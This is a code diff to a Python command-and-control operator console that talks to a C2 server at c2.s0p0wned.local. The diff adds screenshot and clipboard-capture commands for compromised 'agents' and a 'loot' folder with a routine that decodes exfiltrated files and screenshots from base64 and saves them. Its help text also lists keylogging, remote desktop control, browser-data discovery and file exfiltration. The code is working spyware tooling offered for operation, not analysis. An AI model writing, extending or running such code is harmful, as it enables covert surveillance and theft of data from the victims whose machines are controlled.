@@ -11,16 +11,17 @@ import os
 import sys
 import hashlib
 import getpass
+import base64
 from datetime import datetime
 from pathlib import Path
 
 # Configuration
 C2_URL = "http://c2.s0p0wned.local:8443"
 LOG_DIR = Path("logs")
+LOOT_DIR = Path("loot")
 LOG_FILE = LOG_DIR / f"cli_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
 
-# Mot de passe CLI — générer avec :
-#   python3 -c "import hashlib; print(hashlib.sha256(b'tonmotdepasse').hexdigest())"
+# SHA-256 of the operator password
 CLI_PASSWORD_HASH = "310b1e95a0d3f895d83775fc79073b82eef0f02cb47945cbc6e781c70ccbb68b"
 
 # Variables globales
@@ -31,9 +32,81 @@ session_start = datetime.now()
 def init_logs():
     """Initialise le système de logs"""
     LOG_DIR.mkdir(exist_ok=True)
+    LOOT_DIR.mkdir(exist_ok=True)
     log(f"{'=' * 60}")
     log(f"CLI Session Started - {session_start.strftime('%Y-%m-%d %H:%M:%S')}")
     log(f"{'=' * 60}")
+
+
+def save_binary_result(text):
+    """
+    Détecte un bloc base64 dans un résultat (loot grab / screenshot)
+    et sauvegarde le fichier décodé dans loot/.
+
+    Format attendu dans le texte :
+      [File: <chemin>]   ← pour loot grab
+      [Screenshot: ...]  ← pour screenshot
+      [Timestamp: YYYYMMDD_HHMMSS]
+      [Base64]:
+      <données base64>
+      [End of ...]
+
+    Returns: chemin local du fichier sauvegardé, ou None
+    """
+    if '[Base64]:\n' not in text:
+        return None
+
+    # Détecter le nom de fichier
+    filename = None
+    if '[File: ' in text:
+        try:
+            start = text.index('[File: ') + 7
+            end   = text.index(']', start)
+            filename = os.path.basename(text[start:end])
+        except ValueError:
+            pass
+    elif '[Screenshot:' in text:
+        ts = ''
+        if '[Timestamp: ' in text:
+            try:
+                start = text.index('[Timestamp: ') + 12
+                end   = text.index(']', start)
+                ts    = text[start:end]
+            except ValueError:
+                pass
+        filename = f"screenshot_{ts}.bmp" if ts else "screenshot.bmp"
+
+    if not filename:
+        return None
+
+    # Extraire le bloc base64
+    try:
+        b64_start = text.index('[Base64]:\n') + len('[Base64]:\n')
+        end_marker_pos = text.index('\n[End of ', b64_start)
+        b64_data = text[b64_start:end_marker_pos].strip()
+    except ValueError:
+        return None
+
+    # Décoder et sauvegarder
+    try:
+        file_bytes = base64.b64decode(b64_data)
+        LOOT_DIR.mkdir(exist_ok=True)
+
+        save_path = LOOT_DIR / filename
+        # Éviter d'écraser un fichier existant
+        counter = 1
+        while save_path.exists():
+            stem   = Path(filename).stem
+            suffix = Path(filename).suffix
+            save_path = LOOT_DIR / f"{stem}_{counter}{suffix}"
+            counter += 1
+
+        save_path.write_bytes(file_bytes)
+        log(f"Binary file saved: {save_path} ({len(file_bytes)} bytes)")
+        return str(save_path)
+    except Exception as e:
+        log(f"ERROR save_binary_result: {e}")
+        return None
 
 
 def log(message):
@@ -377,6 +450,77 @@ def cmd_loot(args):
         log(f"ERROR: {e}")
 
 
+def cmd_screenshot():
+    """Capture une screenshot sur l'agent sélectionné"""
+    if not current_agent:
+        print("[-] No agent selected. Use 'use <agent_id>' first")
+        return
+
+    try:
+        payload = {
+            "agent_id": current_agent,
+            "type": "shell",
+            "command": "screenshot"
+        }
+
+        log(f"Sending screenshot command to {current_agent}")
+
+        response = requests.post(
+            f"{C2_URL}/command",
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Screenshot command queued for {current_agent}")
+            print(f"[*] Capturing screen (800x600 BMP)...")
+            log("Screenshot command queued")
+
+            # Timeout plus long : capture + encodage base64 ~2 MB
+            wait_for_results(current_agent, timeout=20, poll_interval=2)
+        else:
+            print(f"[-] Server error: {response.status_code}")
+            log(f"ERROR: Server returned {response.status_code}")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        log(f"ERROR: {e}")
+
+
+def cmd_clipboard():
+    """Capture le contenu du presse-papier de l'agent sélectionné"""
+    if not current_agent:
+        print("[-] No agent selected. Use 'use <agent_id>' first")
+        return
+
+    try:
+        payload = {
+            "agent_id": current_agent,
+            "type": "shell",
+            "command": "clipboard"
+        }
+
+        log(f"Sending clipboard command to {current_agent}")
+
+        response = requests.post(
+            f"{C2_URL}/command",
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Clipboard command queued for {current_agent}")
+            log("Clipboard command queued")
+            wait_for_results(current_agent, timeout=10, poll_interval=2)
+        else:
+            print(f"[-] Server error: {response.status_code}")
+            log(f"ERROR: Server returned {response.status_code}")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        log(f"ERROR: {e}")
+
+
 def wait_for_results(agent_id, timeout=10, poll_interval=2):
     """
     Attend et affiche automatiquement les nouveaux résultats
@@ -415,7 +559,6 @@ def wait_for_results(agent_id, timeout=10, poll_interval=2):
                 if len(results_list) > initial_count:
                     print("\r[+] Results received!                    ")
 
-                    # Afficher seulement les nouveaux résultats
                     new_results = results_list[initial_count:]
 
                     print(f"\n{'=' * 70}")
@@ -424,14 +567,26 @@ def wait_for_results(agent_id, timeout=10, poll_interval=2):
 
                     for result in new_results:
                         timestamp = result.get('timestamp', 'N/A')
-                        command = result.get('command', 'N/A')
-                        output = result.get('output', '')
+                        command   = result.get('command', 'N/A')
+                        output    = result.get('output', '')
 
                         print(f"[{timestamp}]")
                         print(f"Command: {command}")
-                        print(f"Output:")
-                        for line in output.split('\n'):
-                            print(f"  {line}")
+
+                        # Détecter et sauvegarder les fichiers binaires (base64)
+                        saved = save_binary_result(output)
+                        if saved:
+                            # Afficher seulement les métadonnées, pas le blob base64
+                            for line in output.split('\n'):
+                                if line.startswith('[Base64]'):
+                                    print(f"  [Base64]: <{len(output)} chars — decoded below>")
+                                    break
+                                print(f"  {line}")
+                            print(f"\n[+] File saved locally: {saved}")
+                        else:
+                            print(f"Output:")
+                            for line in output.split('\n'):
+                                print(f"  {line}")
 
                     print(f"{'=' * 70}\n")
                     log(f"Auto-displayed result for command on {agent_id}")
@@ -566,6 +721,8 @@ Available Commands:
   rdp <args>          Manage Remote Desktop on selected agent
   keylog <args>       Capture keystrokes on selected agent
   loot <args>         Exfiltrate data and search for files
+  screenshot          Capture screen (800x600 BMP → saved in loot/)
+  clipboard           Read clipboard content (text, files, or image detection)
   results [agent_id]  Show command results (current or specified agent)
   watch               Auto-refresh results in real-time (Ctrl+C to stop)
   clear               Clear screen
@@ -588,6 +745,9 @@ Examples:
   loot sysinfo              # Collect system information
   loot browser              # Find browser data locations
   loot find *.txt           # Search for text files
+  loot grab C:\\file.pdf    # Exfiltrate file → saved in loot/
+  screenshot                # Capture screen → saved in loot/
+  clipboard                 # Read clipboard (text / files / image)
   results                   # Show results for current agent
   watch                     # Auto-refresh results every 2s
   results WIN_25653CD9      # Show results for specific agent
@@ -645,23 +805,6 @@ def get_prompt():
         return f"c2({current_agent})> "
     return "c2> "
 
-
-#def setup_readline():
-    """Configure readline pour l'historique"""
-    # Créer le fichier d'historique
-    history_file = LOG_DIR / ".cli_history"
-
-    try:
-        readline.read_history_file(history_file)
-    except FileNotFoundError:
-        pass
-
-    # Sauvegarder l'historique à la sortie
-    import atexit
-    atexit.register(readline.write_history_file, history_file)
-
-    # Configurer l'auto-complétion (basique)
-    readline.parse_and_bind("tab: complete")
 
 def setup_readline():
     """Configure readline pour l'historique (cross-platform)"""
@@ -762,6 +905,10 @@ def main():
                 cmd_keylog(args)
             elif cmd == "loot":
                 cmd_loot(args)
+            elif cmd == "screenshot":
+                cmd_screenshot()
+            elif cmd == "clipboard":
+                cmd_clipboard()
             elif cmd == "results":
                 cmd_results(args if args else None)
             elif cmd == "watch":
